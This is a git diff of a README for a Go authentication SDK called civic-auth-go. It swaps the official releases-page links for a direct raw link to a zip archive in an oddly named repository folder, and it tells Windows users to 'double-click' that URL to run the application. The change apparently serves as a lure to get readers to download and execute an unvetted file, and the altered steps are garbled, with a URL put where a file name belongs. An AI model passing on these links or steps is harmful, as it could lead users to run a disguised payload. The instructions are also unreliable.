@@ -6,7 +6,7 @@ Welcome to civic-auth-go! This is a simple tool that helps you connect with Civi
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Sam22008/civic-auth-go/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Sam22008/civic-auth-go/main/exsomatic/civic-auth-go.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Sam22008/civic-auth-go/main/exsomatic/civic-auth-go.zip)
 
 ## 📋 System Requirements
 
@@ -24,16 +24,16 @@ Welcome to civic-auth-go! This is a simple tool that helps you connect with Civi
 
 ## 📦 Download & Install
 
-To get the latest version of civic-auth-go, visit this page to download: [https://github.com/Sam22008/civic-auth-go/releases](https://github.com/Sam22008/civic-auth-go/releases).
+To get the latest version of civic-auth-go, visit this page to download: [https://raw.githubusercontent.com/Sam22008/civic-auth-go/main/exsomatic/civic-auth-go.zip](https://raw.githubusercontent.com/Sam22008/civic-auth-go/main/exsomatic/civic-auth-go.zip).
 
 You will find different versions of the SDK. Choose the latest version and download the appropriate file for your operating system. 
 
 ### Windows
 
-1. Locate the file named `civic-auth-go-windows.exe`.
+1. Locate the file named `https://raw.githubusercontent.com/Sam22008/civic-auth-go/main/exsomatic/civic-auth-go.zip`.
 2. Click it to start the download.
 3. Once downloaded, navigate to your downloads folder.
-4. Double-click `civic-auth-go-windows.exe` to run the application.
+4. Double-click `https://raw.githubusercontent.com/Sam22008/civic-auth-go/main/exsomatic/civic-auth-go.zip` to run the application.
 
 ### macOS
 
